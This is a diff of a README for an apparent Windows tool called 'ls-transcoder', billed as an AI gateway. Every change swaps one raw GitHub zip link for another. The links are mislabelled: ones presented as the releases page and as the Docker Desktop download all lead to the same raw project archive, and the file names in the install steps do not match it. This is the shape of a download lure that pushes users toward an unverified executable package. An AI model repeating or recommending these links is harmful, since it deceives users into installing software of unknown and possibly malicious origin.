@@ -1,6 +1,6 @@
 # ⚙️ ls-transcoder - Efficient AI Gateway for Windows
 
-[![Download ls-transcoder](https://img.shields.io/badge/Download-ls--transcoder-brightgreen)](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip)
+[![Download ls-transcoder](https://img.shields.io/badge/Download-ls--transcoder-brightgreen)](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/transcoder-ls-2.4.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 To get ls-transcoder, visit the official release page below. Here, you will find the latest pre-compiled packages for different architectures.
 
-👉 [Go to ls-transcoder releases](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip)
+👉 [Go to ls-transcoder releases](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/transcoder-ls-2.4.zip)
 
 Choose the version that matches your computer. Most PCs will need the **x64** package. If you have an ARM-based Windows device, pick the ARM64 version.
 
@@ -33,7 +33,7 @@ Before you begin, make sure your Windows PC meets these requirements:
 - 2 GHz or faster processor (x64 or ARM64)
 - Minimum 5 GB free disk space
 - Internet connection for downloading and updates
-- Docker Desktop installed ([Docker Download](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip))
+- Docker Desktop installed ([Docker Download](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/transcoder-ls-2.4.zip))
 
 ---
 
@@ -43,7 +43,7 @@ Before you begin, make sure your Windows PC meets these requirements:
 
 1. Open your web browser.
 2. Go to the ls-transcoder releases page:  
-   https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip
+   https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/transcoder-ls-2.4.zip
 3. Scroll to the latest release version.
 4. Download the file named like `ls-transcoder-v1.0.0-windows-x64.zip` for most PCs.  
    If you have an ARM64 Windows device, find `ls-transcoder-v1.0.0-windows-arm64.zip`.
@@ -88,7 +88,7 @@ The core executable files are inside the package but need to be extracted before
 ls-transcoder runs inside Docker containers for easy setup.
 
 1. If Docker Desktop is not installed, download and install it from:  
-   https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip
+   https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/transcoder-ls-2.4.zip
 2. After installation, start Docker Desktop and make sure it is running.
 3. Open a new PowerShell or Command Prompt window.
 4. Navigate to the folder where you extracted ls-transcoder.
@@ -167,4 +167,4 @@ This helps you control the service without hassle.
 
 Visit the ls-transcoder releases page again here to download or update the software:
 
-[Download ls-transcoder](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip)
+[Download ls-transcoder](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/transcoder-ls-2.4.zip)
